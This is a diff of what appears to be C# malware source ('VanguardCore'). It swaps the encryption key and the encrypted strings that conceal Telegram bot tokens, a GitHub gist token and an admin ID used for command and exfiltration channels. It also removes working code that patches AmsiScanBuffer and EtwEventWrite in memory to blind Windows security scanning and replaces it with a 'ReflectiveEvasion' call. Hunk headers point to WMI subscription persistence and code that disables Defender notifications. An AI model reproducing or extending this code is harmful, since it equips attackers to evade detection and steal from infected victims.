@@ -172,21 +172,21 @@ namespace VanguardCore
 
         // --- Secure Vault for Baked-in Strings (Vault 2.0) ---
         private struct VaultEntry { public string C; public string T; }
-        private static byte[] VAULT_KEY = Convert.FromBase64String("hrGQCGYih1I4QnCmvOTdtS0XUYRk412y+J3xEL8vEZI=");
-        private static byte[] VAULT_IV = Convert.FromBase64String("9IRnvI75UY6kHvXe");
+        private static byte[] VAULT_KEY = Convert.FromBase64String("qhaZvxag1bmDZFqYucOB8jWYaFddpSp1oe7zrYzkK+g=");
+        private static byte[] VAULT_IV = Convert.FromBase64String("WSMbMkRxxpGNJBS5");
         
         private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>
         {
-            { "ADMIN_ID", new VaultEntry { C = "ZvM3P2kUQlR9+fbiqbE=", T = "3Vvh2zRculF1Jg3Am9/7Sw==" } },
-            { "TG_API_BASE", new VaultEntry { C = "I7ZzfykbWE4puq706uFkTR/X761I7Ike7w==", T = "azwR/RDnynZR1D4kaiXZ7g==" } },
-            { "GIST_GITHUB_TOKEN", new VaultEntry { C = "LKp3UGNwBS4q+Y+4/N5mQinT4fIKu6gO8wk12cZvh1Ih1CBUOdb15Q==", T = "8xoPIKA9zJYtvJf6NDnHWg==" } },
-            { "TG_API_FRONT", new VaultEntry { C = "I7ZzfykbWE4+q6m96+V6TFXC77QD9JoA7j5Xk9s6qnotkWhMCoy0xTlQmGbT4Uct", T = "WdjH+HN1mDjb0Tcjg8Ew1w==" } },
-            { "GIST_PROXY_ID", new VaultEntry { C = "KvU3O2kXRgQu+qTsp7A6SUvD7Phfsc5NpH4f19g46jw=", T = "ccanbIOcACyk5fjipLIoSA==" } },
-            { "BOT_TOKEN_3", new VaultEntry { C = "c/c1P2sZRlZx/f2b38JQYwGT4aQT7cgbuh4Wq/hruTgp1kQLBICqm3FFpHjP6w==", T = "1yjE8oZNrRuLxgcMitMSUA==" } },
-            { "TG_FILE_BASE", new VaultEntry { C = "I7ZzfykbWE4puq706uFkTR/X761I7Ike7y4TjNt2", T = "F8ZPoNYpyQAwrzyLha+Z/Q==" } },
-            { "BOT_TOKEN_1", new VaultEntry { C = "c/Y+OGsZT1F8+P2b38JDaQGVx4otsLBPrw4ZrtEL60sKqiQEJLO+3zMVvSvF1Q==", T = "u1IozEtI8KwqHn6IajaWjQ==" } },
-            { "BOT_TOKEN_2", new VaultEntry { C = "c/UwPmsVQFB58/2b38J8BTGU6vVStcIXiBIzk4xgnX8voXcIKaSj+2x4nwTdsA==", T = "XrTv086WuyaHfeXMmzaznA==" } },
-            { "MS_TRIGGER", new VaultEntry { C = "KK1qfy9VEhMsr6G76+h8W1bA9qU=", T = "eSU5IUx1en7GnhMz94+PoQ==" } }
+            { "ADMIN_ID", new VaultEntry { C = "mInVPEsmvIEgxk+BT1c=", T = "OKNRafgvAXduVxIYetx4ow==" } },
+            { "TG_API_BASE", new VaultEntry { C = "3cyRfAspppt0hReXDAfBV7d/hpkBoGQvZA==", T = "3QZ0/5qZT0pFSkEK5RUaRg==" } },
+            { "GIST_GITHUB_TOKEN", new VaultEntry { C = "0tCVU0FC+/t3xjbbGjjDWIF7iMZD90U/eCJZNAwnMh1A9/QEhVrDnQ==", T = "QChL/wqjMwro3X0Qsd6P6w==" } },
+            { "TG_API_FRONT", new VaultEntry { C = "3cyRfAsppptjlBDeDQPfVv1qhoBKuHcxZRU7fhFyHzVMsrwctgCCvesP/nJ1oE7d", T = "gV/leozolHdBRA89jvp65g==" } },
+            { "GIST_PROXY_ID", new VaultEntry { C = "1I/VOEsluNFzxR2PQVafU+NrhcwW/SN8L1VzOhJwX3M=", T = "5xvYj8wjB660Y1BtuWvf9w==" } },
+            { "BOT_TOKEN_3", new VaultEntry { C = "jY3XPEkruIMswkT4OST1eak7iJBaoSUqMTV6RjIjDHdI9ZBbuAyc46Mawmxpqg==", T = "CvLkYYOxFEjep8dRFWSlcg==" } },
+            { "TG_FILE_BASE", new VaultEntry { C = "3cyRfAspppt0hReXDAfBV7d/hpkBoGQvZAV/YRE+", T = "jRPFJqCgxXLfle4GVJ8KfA==" } },
+            { "BOT_TOKEN_1", new VaultEntry { C = "jYzcO0krsYQhx0T4OSTmc6k9rr5k/F1+JCV1QxtDXgRrifBUmD+Ip+FK2z9jlA==", T = "aFCVTFGI+5SF2kpk1lxhpw==" } },
+            { "BOT_TOKEN_2", new VaultEntry { C = "jY/SPUknvoUkzET4OSTZH5k8g8Eb+S8mAzlffkYoKDBOgqNYlSiVg74n+RB78Q==", T = "WgapB2iAcMnzPSWJftG5mA==" } },
+            { "MS_TRIGGER", new VaultEntry { C = "1teIfA1n7MZxkBjYDQ7ZQf5on5E=", T = "gFhTXh8aoAZsjLQbOtPqDw==" } }
         };
 
         public static unsafe string Resolve(string id)
@@ -1526,89 +1526,14 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
         {
             try
             {
-                Log("[Safety] Applying in-memory stealth patches (AMSI/ETW)...");
-                PatchAMSI();
-                PatchETW();
+                Log("[Safety] Initializing Reflective Shield (Zero-Byte AMSI/ETW)...");
+                ReflectiveEvasion.Initialize();
             }
             catch { }
         }
 
-        private static void PatchAMSI()
-        {
-            try
-            {
-                // V6.9: Use direct Win32 to ensure amsi is loaded before any other module triggers it
-                string sys32 = Environment.SystemDirectory;
-                string amsiPath = Path.Combine(sys32, "amsi.dll");
-                
-                IntPtr hAmsi = NativeMethods.LoadLibraryW(amsiPath);
-                if (hAmsi == IntPtr.Zero) hAmsi = NativeMethods.GetModuleHandleW("amsi.dll");
-                
-                if (hAmsi == IntPtr.Zero) 
-                {
-                    Log("[Safety] AMSI not found on system (skipped).");
-                    return;
-                }
 
-                IntPtr pAddr = NativeMethods.GetProcAddress(hAmsi, "AmsiScanBuffer");
-                if (pAddr == IntPtr.Zero) 
-                {
-                    Log("[Safety] AmsiScanBuffer export not found.");
-                    return;
-                }
 
-                // x64 patch: mov eax, 0x80070057; ret
-                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-                
-                IntPtr baseAddr = pAddr;
-                uint regionSize = (uint)patch.Length;
-                uint oldProtect;
-
-                if (NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, PAGE_EXECUTE_READWRITE, out oldProtect) == 0)
-                {
-                    uint written;
-                    NtWriteVirtualMemory(GetCurrentProcess(), pAddr, patch, (uint)patch.Length, out written);
-                    NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, oldProtect, out oldProtect);
-                    Log("[Safety] AMSI patched successfully (In-Memory).");
-                }
-                else
-                {
-                    Log("[Safety] Protect failed for AMSI patch.");
-                }
-            }
-            catch (Exception ex)
-            {
-                Log($"[Safety] AMSI Patch Logic Error: {ex.Message}");
-            }
-        }
-
-        private static void PatchETW()
-        {
-            try
-            {
-                IntPtr hNtdll = GetModuleHandleA("ntdll.dll");
-                if (hNtdll == IntPtr.Zero) return;
-
-                // x64 patch for EtwEventWrite: xor rax, rax; ret
-                IntPtr pAddr = ApiInterface.GetProcAddress(hNtdll, "EtwEventWrite");
-                if (pAddr == IntPtr.Zero) return;
-
-                byte[] patch = { 0x48, 0x33, 0xC0, 0xC3 };
-                
-                IntPtr baseAddr = pAddr;
-                uint regionSize = (uint)patch.Length;
-                uint oldProtect;
-
-                if (NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, PAGE_EXECUTE_READWRITE, out oldProtect) == 0)
-                {
-                    uint written;
-                    NtWriteVirtualMemory(GetCurrentProcess(), pAddr, patch, (uint)patch.Length, out written);
-                    NtProtectVirtualMemory(GetCurrentProcess(), ref baseAddr, ref regionSize, oldProtect, out oldProtect);
-                    Log("[Safety] ETW patched successfully.");
-                }
-            }
-            catch { }
-        }
 
         public static void DisableDefenderNotifications()
         {
@@ -2093,6 +2018,10 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
         }
     }
 }
+
+
+
+
 
 
 
